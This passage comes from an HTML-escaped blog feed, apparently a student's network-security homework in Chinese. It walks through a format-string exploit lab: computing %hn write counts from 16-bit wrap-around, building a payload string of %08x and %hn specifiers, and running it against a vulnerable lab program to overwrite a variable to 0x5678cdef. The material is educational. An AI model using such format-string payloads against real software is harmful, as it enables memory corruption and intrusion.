+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x3435        &lt;span class=&#34;nv&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x5657        &lt;span class=&#34;nv&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x7879.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Please enter a string:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;����ffffce3c.00005657.00007879.00003435.00005657.00007879.ffffcde4.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;New values      &lt;span class=&#34;nv&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x3435        &lt;span class=&#34;nv&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x5657        &lt;span class=&#34;nv&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x7879.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;变量B的地址送入堆栈，&lt;strong&gt;&amp;amp;B=0xffffce34 =4294954548&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;编译 read2file2.c
+&lt;code&gt;azureuser@MyServer:~/hw$ gcc -m32 -o read2file2 read2file2.c&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;0xCDEF - 5*9 - 12 = 52662
+0x5678 - 0xCDEF = -30583&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;当尝试计算&lt;code&gt;0x5678 - 0xCDEF&lt;/code&gt;时得到了负数，这是因为&lt;code&gt;0x5678&lt;/code&gt;小于&lt;code&gt;0xCDEF&lt;/code&gt;。为了解决这个问题，可以利用无符号整数的环绕性质。&lt;/p&gt;
+&lt;p&gt;将负数&lt;code&gt;-30583&lt;/code&gt;视为一个大的正数。具体来说，将&lt;code&gt;-30583&lt;/code&gt;添加到&lt;code&gt;2^16&lt;/code&gt;（即&lt;code&gt;65536&lt;/code&gt;，因为&lt;code&gt;%hn&lt;/code&gt;写入的是16位值）来得到一个正数：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;65536−30583=34953&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;使用&lt;code&gt;34953&lt;/code&gt;作为&lt;code&gt;%hn&lt;/code&gt;的值来代替&lt;code&gt;-30583&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;得到字符串：
+&lt;code&gt;%08x.%08x.%08x.%08x.%08x.%.52662u%hn%.34953u%hn.%08x.%08x.&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;命令行输入到文件mystring中&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;azureuser@MyServer:~/hw$ ./read2file2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Please enter an address.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;4294954548&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Please enter the format string:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%08x.%08x.%08x.%08x.%08x.%.52662u%hn%.34953u%hn.%08x.%08x.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;The string length is &lt;span class=&#34;m&#34;&gt;70&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;将文件mystring作为输入重定向到漏洞程序，并将输出定向到
+文件result.txt中：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;azureuser@MyServer:~/hw$ ./v2 &amp;lt; mystring &amp;gt; result.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;azureuser@MyServer:~/hw$ tail -n &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; result.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;New values      &lt;span class=&#34;nv&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x3435        &lt;span class=&#34;nv&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x5678cdef    &lt;span class=&#34;nv&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0x7879.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
         </item>
         <item>
         <title>网络安全作业6</title>
